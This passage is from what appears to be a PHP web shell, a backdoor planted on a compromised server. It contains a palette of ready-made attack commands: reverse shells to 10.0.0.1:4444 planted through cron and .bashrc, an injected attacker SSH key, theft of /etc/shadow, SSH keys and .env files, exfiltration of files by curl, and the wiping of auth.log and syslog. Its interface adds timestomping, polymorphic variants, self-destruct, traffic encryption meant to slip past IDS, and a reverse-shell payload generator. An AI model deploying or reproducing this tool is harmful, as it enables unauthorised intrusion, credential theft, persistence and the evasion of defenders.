    } elseif ($exec_method === null) {
        $out = "[error] no execution method available. Check Diagnostics.";
    } else {
        $result = run_command($cmd, $cwd, $available);
        $out = $result['stdout'];
        if (trim($result['stderr']) !== '') {
            $out .= ($out !== '' ? "\n" : '') . $result['stderr'];
        }
        if (trim($out) === '') $out = '(no output)';
        $_SESSION['last_method'] = $result['method'];
    }
}

function e($s) { return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8'); }

// ─────────────────────────────────────────────────────────────
//  User info
// ─────────────────────────────────────────────────────────────

if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
    $u = @posix_getpwuid(posix_geteuid());
    $user = is_array($u) && isset($u['name']) ? $u['name'] : 'unknown';
} else {
    $user = getenv('USERNAME') ?: 'unknown';
}
$host = gethostname() ?: 'unknown';

// ─────────────────────────────────────────────────────────────
//  Command palette (Linux)
// ─────────────────────────────────────────────────────────────

$command_groups = [
    '1. System Recon' => [
        'whoami / id / uname / hostname'   => 'whoami; id; uname -a; hostname',
        'OS release'                       => 'cat /etc/os-release',
        'Users (/etc/passwd)'              => 'cat /etc/passwd',
        'Groups (/etc/group)'              => 'cat /etc/group',
        'Sudo privileges'                  => 'sudo -l',
        'Environment variables'            => 'env',
        'Hosts file'                       => 'cat /etc/hosts',
        'DNS resolvers'                    => 'cat /etc/resolv.conf',
        'IP & routing'                     => 'ip a; ip r',
        'Listening ports (ss)'             => 'ss -tulnp',
        'Running processes'                => 'ps aux',
        'Process tree'                     => 'ps -ef --forest',
        'Logged-in users'                  => 'w; who; last -a | head',
        'Cron jobs'                        => 'crontab -l; ls -la /etc/cron*',
    ],
    '2. SUID / SGID / Capabilities' => [
        'SUID files'                       => 'find / -perm -4000 -type f 2>/dev/null',
        'SGID files'                       => 'find / -perm -2000 -type f 2>/dev/null',
        'Writable directories'             => 'find / -writable -type d 2>/dev/null',
        'Capabilities'                     => 'getcap -r / 2>/dev/null',
    ],
    '3. Privilege Escalation' => [
        'Sudo list'                        => 'sudo -l',
        'SUID owned by root'               => 'find / -user root -perm -4000 2>/dev/null',
        'System crontab'                   => 'cat /etc/crontab',
        'Cron.d / cron.daily'              => 'ls -la /etc/cron.d /etc/cron.daily',
        'Kernel info'                      => 'uname -a; cat /proc/version',
        'Sudo package version'             => 'dpkg -l | grep -i sudo',
    ],
    '4. Credential Harvesting' => [
        'Shadow file (requires root)'      => 'cat /etc/shadow',
        'Bash history'                     => 'cat ~/.bash_history',
        'SSH private keys'                 => 'find / -name "id_rsa" 2>/dev/null',
        'PEM files'                        => 'find / -name "*.pem" 2>/dev/null',
        '.env files'                       => 'find / -name ".env" 2>/dev/null',
        'wp-config.php'                    => 'find / -name "wp-config.php" 2>/dev/null',
        'Grep password in /var/www'        => 'grep -rEi "password|passwd|secret|api[_-]?key" /var/www 2>/dev/null',
    ],
    '5. Persistence (Change IP!)' => [
        'Cron reverse shell'               => 'echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\'" | crontab -',
        'SSH authorized_keys'              => 'echo "ssh-rsa AAAA...attacker" >> ~/.ssh/authorized_keys',
        'Backdoor .bashrc'                 => 'echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> ~/.bashrc',
    ],
    '6. File Transfer (Change IP!)' => [
        'Download via wget'                => 'wget http://10.0.0.1/tool -O /tmp/tool',
        'Download via curl'                => 'curl -o /tmp/tool http://10.0.0.1/tool',
        'Exfil /etc/passwd via curl'       => 'curl -X POST -F "file=@/etc/passwd" http://10.0.0.1/upload',
    ],
    '7. Internal Pivoting' => [
        'Ping sweep 192.168.1.0/24'        => 'for i in $(seq 1 254); do (ping -c 1 -W 1 192.168.1.$i >/dev/null && echo "192.168.1.$i up") & done; wait',
        'Quick port scan (bash /dev/tcp)'  => 'for p in 22 80 443 3306 5432 6379 8080 9200; do (echo > /dev/tcp/192.168.1.10/$p) 2>/dev/null && echo "port $p open"; done',
    ],
    '8. Log Tampering' => [
        'Clear auth.log'                   => 'echo > /var/log/auth.log',
        'Clear syslog'                     => 'echo > /var/log/syslog',
        'Clear history (this session)'     => 'history -c',
        'Delete .bash_history'             => 'rm -f ~/.bash_history',
    ],
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shell — <?php echo e($host); ?></title>
<style>
    :root {
        --bg: #0f172a;
        --bg2: #1e293b;
        --bg3: #131c2e;
        --code: #0a0f1c;
        --cy: #22d3ee;
        --gr: #10b981;
        --rd: #ef4444;
        --am: #f59e0b;
        --tx: #f1f5f9;
        --tx2: #cbd5e1;
        --mu: #64748b;
        --bd: #475569;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
        font-family: 'Segoe UI', system-ui, sans-serif;
        background: var(--bg);
        background-image: radial-gradient(ellipse at 30% 0%, rgba(34,211,238,.08), transparent 60%);
        color: var(--tx);
        min-height: 100vh;
        display: flex;
        justify-content: center;
        padding: 16px;
    }
    .wrap { width: 100%; max-width: 960px; display: flex; flex-direction: column; gap: 12px; }

    /* ── Header ── */
    .hd {
        display: flex; align-items: center; gap: 14px;
        background: var(--bg2);
        border: 1px solid var(--bd);
        border-radius: 12px;
        padding: 14px 18px;
        position: relative; overflow: hidden;
        flex-wrap: wrap;
    }
    .hd::before {
        content:''; position:absolute; top:0; left:0; right:0; height:2px;
        background: linear-gradient(90deg, transparent, var(--cy), transparent);
    }
    .hd .ico {
        width: 40px; height: 40px; border-radius: 50%;
        display: flex; align-items: center; justify-content: center;
        background: rgba(34,211,238,.12);
        border: 1px solid rgba(34,211,238,.35);
        color: var(--cy); font-size: 18px; font-weight: bold;
        box-shadow: 0 0 16px rgba(34,211,238,.25);
        flex-shrink: 0;
    }
    .hd h1 { font-size: .95rem; font-weight: 600; }
    .hd h1 .u { color: var(--cy); }
    .hd h1 .h { color: var(--gr); }
    .hd p  { font-size: .72rem; color: var(--mu); margin-top: 2px; }
    .hd .exec-tag {
        display: inline-block;
        color: var(--gr);
        background: rgba(16,185,129,.12);
        border: 1px solid rgba(16,185,129,.35);
        padding: 1px 7px; border-radius: 4px;
        font-family: monospace; font-size: .68rem; font-weight: 700;
        margin-left: 6px;
    }
    .hd .exec-tag.fail {
        color: var(--rd);
        background: rgba(239,68,68,.12);
        border-color: rgba(239,68,68,.35);
    }
    .hd-actions {
        margin-left: auto;
        display: flex; gap: 6px; flex-wrap: wrap;
    }
    .hd .diag-btn {
        background: rgba(34,211,238,.10);
        border: 1px solid rgba(34,211,238,.35);
        color: var(--cy);
        padding: 7px 14px;
        border-radius: 7px;
        cursor: pointer;
        font-size: .72rem; font-weight: 700;
        transition: all .2s;
        white-space: nowrap;
        font-family: inherit;
    }
    .hd .diag-btn:hover {
        background: rgba(34,211,238,.20);
        box-shadow: 0 0 12px rgba(34,211,238,.25);
    }
    .hd .diag-btn.danger {
        background: rgba(239,68,68,.10);
        border-color: rgba(239,68,68,.35);
        color: var(--rd);
    }
    .hd .diag-btn.danger:hover {
        background: rgba(239,68,68,.20);
        box-shadow: 0 0 12px rgba(239,68,68,.25);
    }

    /* ── Terminal shell ── */
    .term {
        background: var(--code);
        border: 1px solid var(--bd);
        border-radius: 12px;
        overflow: hidden;
        flex: 1;
        display: flex; flex-direction: column;
        box-shadow: 0 20px 60px rgba(0,0,0,.5), 0 0 60px rgba(34,211,238,.04);
    }
    .bar {
        display: flex; align-items: center; gap: 7px;
        padding: 9px 14px;
        background: var(--bg3);
        border-bottom: 1px solid var(--bd);
    }
    .bar .d { width: 10px; height: 10px; border-radius: 50%; }
    .bar .r { background: #ff5f56; }
    .bar .y { background: #ffbd2e; }
    .bar .g { background: #27c93f; }
    .bar .t { margin-left: 10px; font-size: .72rem; color: var(--mu); font-family: monospace; }
    .bar .p {
        margin-left: auto;
        font-family: monospace; font-size: .72rem;
        color: var(--cy);
        background: rgba(34,211,238,.08);
        border: 1px solid rgba(34,211,238,.2);
        padding: 2px 8px; border-radius: 5px;
        max-width: 55%; overflow: hidden;
        white-space: nowrap; text-overflow: ellipsis;
    }

    /* ── Tabs ── */
    .tabs {
        display: flex; gap: 2px;
        padding: 8px 14px 0;
        background: var(--bg3);
        border-bottom: 1px solid var(--bd);
        flex-wrap: wrap;
    }
    .tab {
        background: transparent;
        border: 1px solid transparent;
        border-bottom: none;
        color: var(--mu);
        padding: 8px 14px;
        border-radius: 7px 7px 0 0;
        cursor: pointer;
        font-size: .74rem; font-weight: 600;
        font-family: inherit;
        transition: all .15s;
        white-space: nowrap;
    }
    .tab:hover { color: var(--tx); background: rgba(34,211,238,.05); }
    .tab.active {
        background: var(--code);
        border-color: var(--bd);
        color: var(--cy);
        border-bottom: 1px solid var(--code);
        margin-bottom: -1px;
    }
    .tab-panel {
        display: none;
        flex: 1;
        flex-direction: column;
        overflow: hidden;
        min-height: 480px;  /* FIX: guarantees consistent panel height */
    }
    .tab-panel.active { display: flex; }

    /* ── Terminal body ── */
    .body {
        flex: 1;
        padding: 16px;
        font-family: monospace;
        font-size: .85rem;
        line-height: 1.55;
        overflow-y: auto;
        white-space: pre-wrap;
        word-break: break-word;
        color: var(--tx2);
        min-height: 380px;
        max-height: 60vh;
    }
    .body::-webkit-scrollbar { width: 8px; }
    .body::-webkit-scrollbar-thumb { background: rgba(71,85,105,.6); border-radius: 6px; }
    .body::-webkit-scrollbar-thumb:hover { background: var(--cy); }

    .welcome { color: var(--mu); font-size: .78rem; border-bottom: 1px dashed rgba(71,85,105,.5); padding-bottom: 10px; margin-bottom: 10px; }
    .welcome b { color: var(--cy); }

    .p-line { color: var(--gr); font-weight: bold; }
    .p-line .pd { color: var(--cy); }
    .p-line .c  { color: var(--tx); font-weight: normal; }
    .o-line { color: var(--tx2); }

    /* ── Diagnostics panel ── */
    .diag-panel {
        display: none;
        background: var(--code);
        border: 1px solid var(--bd);
        border-radius: 12px;
        padding: 18px 22px;
        font-family: monospace;
        font-size: .82rem;
    }
    .diag-panel.show { display: block; }
    .diag-panel h3 {
        color: var(--cy);
        font-size: .85rem; font-weight: 700;
        margin-bottom: 14px;
        text-transform: uppercase;
        letter-spacing: .08em;
    }
    .diag-row {
        display: flex; gap: 12px;
        padding: 9px 0;
        border-bottom: 1px solid rgba(71,85,105,.25);
        align-items: flex-start;
    }
    .diag-row:last-child { border-bottom: none; }
    .diag-row .mark {
        font-weight: 700; width: 18px;
        text-align: center; flex-shrink: 0;
        font-size: 1rem;
    }
    .diag-row .mark.ok  { color: var(--gr); }
    .diag-row .mark.bad { color: var(--rd); }
    .diag-row .name {
        color: var(--tx); font-weight: 600;
        min-width: 110px; flex-shrink: 0;
    }
    .diag-row .info { color: var(--mu); font-size: .74rem; word-break: break-word; }

    /* ── Command dropdown ── */
    .cmd-picker {
        display: flex; align-items: center; gap: 10px;
        padding: 10px 14px;
        background: linear-gradient(180deg, #182238, var(--bg3));
        border-top: 1px solid var(--bd);
        flex-wrap: wrap;
    }
    .cmd-picker .lbl {
        font-size: .74rem;
        text-transform: uppercase;
        letter-spacing: .08em;
        color: var(--am); font-weight: 700;
        display: flex; align-items: center; gap: 6px;
        white-space: nowrap;
    }
    .cmd-picker .lbl::before {
        content:''; display: inline-block;
        width: 8px; height: 8px;
        background: var(--am);
        border-radius: 50%;
        box-shadow: 0 0 8px var(--am);
    }
    .cmd-picker select {
        flex: 1; min-width: 240px;
        background: rgba(15,23,42,.9);
        border: 1px solid rgba(245,158,11,.4);
        border-radius: 7px;
        padding: 9px 12px;
        color: #fcd34d;
        font-family: monospace; font-size: .82rem;
        outline: none; cursor: pointer;
        transition: all .2s;
        appearance: none;
        background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23f59e0b' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
        background-repeat: no-repeat;
        background-position: right 12px center;
        padding-right: 34px;
    }
    .cmd-picker select:focus {
        border-color: var(--am);
        box-shadow: 0 0 0 3px rgba(245,158,11,.15);
    }
    .cmd-picker select option,
    .cmd-picker select optgroup {
        background: var(--bg2); color: var(--tx2); padding: 4px;
    }
    .cmd-picker select optgroup {
        color: var(--am); font-weight: 700; background: var(--bg);
    }

    /* ── Command input ── */
    .in {
        display: flex; align-items: center; gap: 8px;
        padding: 10px 14px;
        background: #0d1526;
        border-top: 1px solid var(--bd);
    }
    .in .pf {
        font-family: monospace; font-size: .9rem; font-weight: bold;
        color: var(--gr); white-space: nowrap;
    }
    .in .pf .pd { color: var(--cy); }
    .in input {
        flex: 1;
        background: rgba(15,23,42,.85);
        border: 1px solid rgba(34,211,238,.25);
        border-radius: 7px;
        padding: 10px 12px;
        color: var(--tx);
        font-family: monospace; font-size: .9rem;
        outline: none; transition: all .2s;
    }
    .in input:focus {
        border-color: var(--cy);
        box-shadow: 0 0 0 3px rgba(34,211,238,.12);
    }
    .in button {
        padding: 10px 18px;
        background: linear-gradient(135deg, var(--cy), #3b82f6);
        border: none; border-radius: 7px;
        color: var(--bg); font-weight: 700; font-size: .82rem;
        cursor: pointer; transition: all .2s;
        box-shadow: 0 4px 16px rgba(34,211,238,.25);
    }
    .in button:hover { transform: translateY(-1px); box-shadow: 0 6px 22px rgba(34,211,238,.4); }

    /* ── File Manager ── */
    .fm-toolbar {
        display: flex; gap: 6px; padding: 10px 14px;
        background: var(--bg3);
        border-bottom: 1px solid var(--bd);
        align-items: center; flex-wrap: wrap;
        font-family: monospace; font-size: .78rem;
    }
    .fm-toolbar .path {
        color: var(--cy);
        background: rgba(34,211,238,.08);
        border: 1px solid rgba(34,211,238,.2);
        padding: 4px 10px; border-radius: 5px;
        flex: 1; min-width: 200px;
        white-space: nowrap;
        overflow: hidden; text-overflow: ellipsis;
    }
    .fm-btn {
        background: rgba(34,211,238,.10);
        border: 1px solid rgba(34,211,238,.35);
        color: var(--cy);
        padding: 5px 10px; border-radius: 6px;
        cursor: pointer;
        font-size: .72rem; font-weight: 700;
        font-family: inherit;
        transition: all .15s;
    }
    .fm-btn:hover { background: rgba(34,211,238,.20); }
    .fm-btn.danger {
        background: rgba(239,68,68,.10);
        border-color: rgba(239,68,68,.35);
        color: var(--rd);
    }
    .fm-btn.danger:hover { background: rgba(239,68,68,.20); }
    .fm-list {
        flex: 1; overflow-y: auto;
        padding: 6px 0;
        font-family: monospace; font-size: .82rem;
    }
    .fm-list::-webkit-scrollbar { width: 8px; }
    .fm-list::-webkit-scrollbar-thumb { background: rgba(71,85,105,.6); border-radius: 6px; }
    .fm-row {
        display: grid;
        grid-template-columns: 24px 1fr 90px 60px 140px;
        gap: 10px;
        padding: 8px 14px;
        border-bottom: 1px solid rgba(71,85,105,.15);
        cursor: pointer;
        align-items: center;
    }
    .fm-row:hover { background: rgba(34,211,238,.06); }
    .fm-row .icon { text-align: center; font-size: 1rem; }
    .fm-row .name { color: var(--tx); word-break: break-all; }
    .fm-row .name.dir { color: var(--cy); font-weight: 600; }
    .fm-row .size { color: var(--mu); font-size: .74rem; text-align: right; }
    .fm-row .perm { color: var(--am); font-size: .72rem; }
    .fm-row .mtime { color: var(--mu); font-size: .72rem; }
    .fm-empty {
        text-align: center; color: var(--mu);
        padding: 40px 20px; font-style: italic;
    }

    /* File editor modal */
    .fm-editor {
        position: fixed; top: 50%; left: 50%;
        transform: translate(-50%, -50%);
        width: 90%; max-width: 800px; max-height: 85vh;
        background: var(--code);
        border: 1px solid var(--cy);
        border-radius: 12px;
        box-shadow: 0 20px 60px rgba(0,0,0,.8), 0 0 40px rgba(34,211,238,.2);
        display: none; flex-direction: column;
        z-index: 1000;
    }
    .fm-editor.show { display: flex; }
    .fm-editor-header {
        padding: 12px 18px;
        border-bottom: 1px solid var(--bd);
        display: flex; align-items: center; gap: 10px;
        background: var(--bg3);
        border-radius: 12px 12px 0 0;
    }
    .fm-editor-header .fname {
        color: var(--cy); font-family: monospace;
        flex: 1; font-size: .82rem;
    }
    .fm-editor textarea {
        flex: 1; min-height: 400px;
        background: var(--code); color: var(--tx2);
        border: none; outline: none;
        padding: 14px 18px;
        font-family: monospace; font-size: .82rem;
        line-height: 1.55; resize: vertical;
    }
    .fm-editor-footer {
        padding: 12px 18px;
        border-top: 1px solid var(--bd);
        display: flex; gap: 8px; justify-content: flex-end;
        background: var(--bg3);
        border-radius: 0 0 12px 12px;
    }

    /* ── Port Scanner ── */
    .scan-form {
        padding: 14px 18px;
        display: grid;
        grid-template-columns: 1fr 1fr;
        gap: 10px;
        background: var(--bg3);
        border-bottom: 1px solid var(--bd);
    }
    .scan-form label {
        display: block;
        font-size: .72rem; color: var(--mu);
        margin-bottom: 4px; font-family: monospace;
    }
    .scan-form input[type="text"],
    .scan-form input[type="number"] {
        width: 100%;
        background: rgba(15,23,42,.85);
        border: 1px solid rgba(34,211,238,.25);
        border-radius: 6px;
        padding: 8px 10px;
        color: var(--tx);
        font-family: monospace; font-size: .82rem;
        outline: none;
    }
    .scan-form input:focus { border-color: var(--cy); }
    .scan-form .row-2 { display: flex; gap: 10px; align-items: flex-end; }
    .scan-form .checkbox-row {
        display: flex; align-items: center; gap: 6px;
        color: var(--mu); font-size: .74rem;
        font-family: monospace;
    }
    .scan-results {
        flex: 1; overflow-y: auto;
        padding: 10px 18px;
        font-family: monospace; font-size: .82rem;
    }
    .scan-results table { width: 100%; border-collapse: collapse; }
    .scan-results th {
        text-align: left; padding: 6px 10px;
        color: var(--cy); font-size: .72rem;
        text-transform: uppercase; letter-spacing: .05em;
        border-bottom: 1px solid var(--bd);
    }
    .scan-results td {
        padding: 6px 10px;
        border-bottom: 1px solid rgba(71,85,105,.15);
        color: var(--tx2); font-size: .8rem;
    }
    .scan-results .port-num { color: var(--gr); font-weight: 700; }
    .scan-results .banner { color: var(--mu); font-size: .72rem; word-break: break-all; }

    /* ── PHP Console ── */
    .console-editor {
        padding: 14px 18px;
        display: flex; flex-direction: column; gap: 10px;
        background: var(--bg3);
        border-bottom: 1px solid var(--bd);
    }
    .console-editor textarea {
        min-height: 180px;
        background: var(--code); color: var(--tx2);
        border: 1px solid var(--bd);
        border-radius: 8px;
        padding: 12px 14px;
        font-family: monospace; font-size: .82rem;
        outline: none; resize: vertical; line-height: 1.5;
    }
    .console-editor textarea:focus { border-color: var(--cy); }
    .console-actions { display: flex; gap: 8px; align-items: center; }
    .console-actions input[type="number"] {
        width: 70px;
        background: rgba(15,23,42,.85);
        border: 1px solid rgba(34,211,238,.25);
        border-radius: 6px;
        padding: 6px 10px;
        color: var(--tx);
        font-family: monospace; font-size: .78rem;
    }
    .console-output {
        flex: 1; overflow-y: auto;
        padding: 14px 18px;
        font-family: monospace; font-size: .82rem;
        background: var(--code);
        color: var(--tx2);
        white-space: pre-wrap; word-break: break-word;
    }

    /* ── Payload Generator ── */
    .payload-form {
        padding: 14px 18px;
        display: grid;
        grid-template-columns: 1fr 100px 180px;
        gap: 10px;
        background: var(--bg3);
        border-bottom: 1px solid var(--bd);
    }
    .payload-form label {
        display: block;
        font-size: .72rem; color: var(--mu);
        margin-bottom: 4px; font-family: monospace;
    }
    .payload-form input, .payload-form select {
        width: 100%;
        background: rgba(15,23,42,.85);
        border: 1px solid rgba(34,211,238,.25);
        border-radius: 6px;
        padding: 8px 10px;
        color: var(--tx);
        font-family: monospace; font-size: .82rem;
        outline: none;
    }
    .payload-form select {
        appearance: none;
        background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%2322d3ee' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
        background-repeat: no-repeat;
        background-position: right 10px center;
        padding-right: 30px;
    }
    .payload-list { flex: 1; overflow-y: auto; padding: 12px 18px; }
    .payload-card {
        background: var(--bg3);
        border: 1px solid var(--bd);
        border-radius: 10px;
        padding: 12px 14px;
        margin-bottom: 10px;
    }
    .payload-card .header {
        display: flex; align-items: center; gap: 8px;
        margin-bottom: 8px;
    }
    .payload-card .lang {
        font-size: .72rem; font-weight: 700; color: var(--cy);
        background: rgba(34,211,238,.10);
        border: 1px solid rgba(34,211,238,.35);
        padding: 2px 8px; border-radius: 4px;
        font-family: monospace; text-transform: uppercase;
        letter-spacing: .05em;
    }
    .payload-card .desc { color: var(--mu); font-size: .74rem; flex: 1; }
    .payload-card pre {
        background: var(--code);
        border-radius: 6px;
        padding: 10px 12px;
        overflow-x: auto;
        font-family: monospace; font-size: .78rem;
        color: var(--tx2);
        margin-bottom: 8px;
        white-space: pre-wrap; word-break: break-all;
    }
    .payload-card .actions { display: flex; gap: 6px; }

    .note {
        text-align: center; font-size: .7rem; color: var(--mu);
        padding: 4px 0;
    }
    .note .w { color: var(--am); }

    /* ── Responsive ── */
    @media (max-width: 600px) {
        body { padding: 10px; }
        .hd { padding: 12px 14px; }
        .hd h1 { font-size: .85rem; }
        .hd-actions { margin-left: 0; width: 100%; }
        .hd .diag-btn { padding: 6px 10px; font-size: .68rem; }
        .tab-panel { min-height: 400px; }
        .body { font-size: .78rem; padding: 12px; min-height: 300px; }
        .in { flex-wrap: wrap; }
        .in .pf { font-size: .78rem; }
        .in button { width: 100%; }
        .cmd-picker select { min-width: 100%; }
        .scan-form, .payload-form { grid-template-columns: 1fr; }
        .fm-row { grid-template-columns: 24px 1fr 60px; }
        .fm-row .perm, .fm-row .mtime { display: none; }
    }
</style>
</head>
<body>
<div class="wrap">

    <!-- ═══════════ Header ═══════════ -->
    <div class="hd">
        <div class="ico">&#62;_</div>
        <div>
            <h1><span class="u"><?php echo e($user); ?></span>@<span class="h"><?php echo e($host); ?></span></h1>
            <p>
                <?php echo e($os_family); ?> &middot; PHP <?php echo e(PHP_VERSION); ?>
                <span class="exec-tag <?php echo $exec_method ? '' : 'fail'; ?>">
                    exec: <?php echo e($exec_method ?: 'none'); ?>
                </span>
            </p>
        </div>
        <div class="hd-actions">
            <button type="button" class="diag-btn" id="diagBtn">ⓘ Diagnostics</button>
            <button type="button" class="diag-btn" id="cryptoBtn">
                <?php echo !empty($_SESSION['cyan_key']) ? '🔐 Encryption' : '🔓 Encryption'; ?>
            </button>
            <button type="button" class="diag-btn" id="stompBtn" title="Timestomp this file">🕒</button>
            <button type="button" class="diag-btn" id="polyBtn" title="Generate polymorphic variant">🧬</button>
            <button type="button" class="diag-btn danger" id="selfDestructBtn" title="Self-destruct">☠</button>
        </div>
    </div>

    <!-- ═══════════ Crypto panel ═══════════ -->
    <div class="diag-panel" id="cryptoPanel">
        <h3>Traffic Encryption (AES-256-CBC)</h3>
        <?php if (empty($_SESSION['cyan_key'])): ?>
            <div class="diag-row">
                <span class="mark bad">🔓</span>
                <span class="name">Status</span>
                <span class="info">Encryption is currently <strong>disabled</strong>. POST bodies are visible to any network observer, WAF, or IDS.</span>
            </div>
            <div class="diag-row">
                <span class="mark ok">🔑</span>
                <span class="name">Set password</span>
                <span class="info">
                    <input type="password" id="cyanPw" placeholder="passphrase..." autocomplete="new-password"
                           style="background:rgba(15,23,42,.85);border:1px solid rgba(34,211,238,.25);border-radius:6px;
                                  padding:6px 10px;color:#e2e8f0;font-family:monospace;font-size:.82rem;margin-right:8px;">
                    <button type="button" class="diag-btn" id="cyanSetBtn">Enable</button>
                </span>
            </div>
            <div style="color:var(--mu);font-size:.74rem;margin-top:8px;">
                ⓘ The passphrase stays in your browser (sessionStorage). PBKDF2-SHA256 (100k iterations) derives the AES key.
            </div>
        <?php else: ?>
            <div class="diag-row">
                <span class="mark ok">🔐</span>
                <span class="name">Status</span>
                <span class="info"><strong style="color:var(--gr)">Active</strong> — AES-256-CBC with PBKDF2-SHA256 key derivation.</span>
            </div>
            <div class="diag-row">
                <span class="mark bad">🔓</span>
                <span class="name">Disable</span>
                <span class="info">
                    <button type="button" class="diag-btn danger" id="cyanOffBtn">Turn off encryption</button>
                </span>
            </div>
        <?php endif; ?>
    </div>

    <!-- ═══════════ Terminal ═══════════ -->
    <div class="term">
        <div class="bar">
            <span class="d r"></span>
            <span class="d y"></span>
            <span class="d g"></span>
            <span class="t">interactive shell — <?php echo $is_win ? 'windows' : 'linux'; ?></span>
            <span class="p" title="<?php echo e($cwd); ?>"><?php echo e($cwd); ?></span>
        </div>

        <div class="tabs">
            <button class="tab active" data-tab="terminal">⌨ Terminal</button>
            <button class="tab" data-tab="files">📁 Files</button>
            <button class="tab" data-tab="scanner">🔍 Scanner</button>
            <button class="tab" data-tab="console">&lt;/&gt; PHP Console</button>
            <button class="tab" data-tab="payload">💥 Payload</button>
        </div>

        <!-- Terminal tab -->
        <div class="tab-panel active" id="tab-terminal">
            <div class="body" id="body">
                <div class="welcome">
                    Type a command below and press <b>Enter</b> to run it.<br>
                    Use <b>&#8593;</b>/<b>&#8595;</b> for history. The <b>cd</b> command is supported and persisted in the session.<br>
                    Or pick a ready-made command from the <b>dropdown</b> below.
                </div>
                <?php if ($cmd !== ''): ?>
                    <div class="p-line">
                        <?php echo e($user); ?>@<?php echo e($host); ?>:<span class="pd"><?php echo e($cwd); ?></span>$ <span class="c"><?php echo e($cmd); ?></span>
                    </div>
                    <div class="o-line"><?php echo e($out); ?></div>
                <?php endif; ?>
            </div>

            <div class="cmd-picker">
                <span class="lbl">Command</span>
                <select id="cmdPicker">
                    <option value="">— Select a ready-made command —</option>
                    <?php foreach ($command_groups as $group => $items): ?>
                        <optgroup label="<?php echo e($group); ?>">
                            <?php foreach ($items as $label => $actual): ?>
                                <option value="<?php echo e($actual); ?>"><?php echo e($label); ?></option>
                            <?php endforeach; ?>
                        </optgroup>
                    <?php endforeach; ?>
                </select>
            </div>

            <form method="POST" autocomplete="off" id="f">
                <div class="in">
                    <span class="pf">
                        <?php echo e($user); ?>@<?php echo e($host); ?>:<span class="pd"><?php echo e($cwd); ?></span>$
                    </span>
                    <input type="text" name="cmd" id="cmd" placeholder="type a command..." autofocus autocomplete="off" spellcheck="false">
                    <button type="submit">Run</button>
                </div>
            </form>
        </div>

        <!-- Files tab -->
        <div class="tab-panel" id="tab-files">
            <div class="fm-toolbar">
                <button class="fm-btn" id="fmUpBtn" title="Go up">↑</button>
                <button class="fm-btn" id="fmReloadBtn" title="Reload">⟳</button>
                <span class="path" id="fmPath"><?php echo e($cwd); ?></span>
                <input type="text" id="fmPathInput" placeholder="path..."
                       style="background:rgba(15,23,42,.85);border:1px solid rgba(34,211,238,.25);border-radius:5px;
                              padding:5px 8px;color:#e2e8f0;font-family:monospace;font-size:.75rem;width:180px;">
                <button class="fm-btn" id="fmGoBtn">Go</button>
                <button class="fm-btn" id="fmMkdirBtn">+ Dir</button>
                <button class="fm-btn" id="fmUploadBtn">↑ Upload</button>
                <input type="file" id="fmUploadInput" style="display:none;">
            </div>
            <div class="fm-list" id="fmList"></div>
        </div>

        <!-- Scanner tab -->
        <div class="tab-panel" id="tab-scanner">
            <div class="scan-form">
                <div>
                    <label>Target (IP / hostname)</label>
                    <input type="text" id="scanTarget" placeholder="192.168.1.1" value="127.0.0.1">
                </div>
                <div>
                    <label>Ports (comma-separated or range)</label>
                    <input type="text" id="scanPorts" placeholder="22,80,443,3306,8000-8100"
                           value="21,22,23,25,80,110,143,443,445,1433,3306,3389,5432,5900,6379,8080,8443,9200,27017">
                </div>
                <div class="row-2">
                    <div style="flex:1;">
                        <label>Timeout (sec)</label>
                        <input type="number" id="scanTimeout" value="2" min="1" max="10">
                    </div>
                    <label class="checkbox-row" style="margin-top:20px;">
                        <input type="checkbox" id="scanBanner" checked> Banner grab
                    </label>
                </div>
                <div class="row-2">
                    <button type="button" class="fm-btn" id="scanStartBtn"
                            style="padding:8px 18px;font-size:.78rem;">▶ Start Scan</button>
                </div>
            </div>
            <div class="scan-results" id="scanResults">
                <div class="fm-empty">Enter a target and click Start Scan.</div>
            </div>
        </div>

        <!-- Console tab -->
        <div class="tab-panel" id="tab-console">
            <div class="console-editor">
                <textarea id="consoleCode" placeholder="// Enter PHP code here, without &lt;?php tags&#10;// Example:&#10;//   echo php_uname();&#10;//   print_r(scandir('.'));&#10;//   echo file_get_contents('/etc/passwd');"><?php echo e($_SESSION['php_console_code'] ?? ''); ?></textarea>
                <div class="console-actions">
                    <button type="button" class="fm-btn" id="consoleRunBtn" style="padding:8px 18px;font-size:.78rem;">▶ Execute</button>
                    <button type="button" class="fm-btn danger" id="consoleClearBtn" style="padding:8px 18px;font-size:.78rem;">✕ Clear</button>
                    <label style="color:var(--mu);font-size:.74rem;font-family:monospace;margin-left:auto;">
                        Timeout: <input type="number" id="consoleTimeout" value="10" min="1" max="60"> s
                    </label>
                </div>
            </div>
            <div class="console-output" id="consoleOutput"><?php echo e($_SESSION['php_console_output'] ?? '// Output will appear here after you click Execute.'); ?></div>
        </div>

        <!-- Payload tab -->
        <div class="tab-panel" id="tab-payload">
            <div class="payload-form">
                <div>
                    <label>Your IP (LHOST)</label>
                    <input type="text" id="rshLhost" placeholder="10.0.0.1" value="">
                </div>
                <div>
                    <label>Port</label>
                    <input type="text" id="rshLport" placeholder="4444" value="4444">
                </div>
                <div>
                    <label>Shell type</label>
                    <select id="rshType">
                        <option value="bash">Bash (/dev/tcp)</option>
                        <option value="nc-mkfifo">Netcat + mkfifo</option>
                        <option value="nc-e">Netcat -e</option>
                        <option value="python3">Python 3</option>
                        <option value="python2">Python 2</option>
                        <option value="perl">Perl</option>
                        <option value="php">PHP</option>
                        <option value="powershell">PowerShell</option>
                        <option value="socat">Socat</option>
                        <option value="nodejs">Node.js</option>
                    </select>
                </div>
            </div>
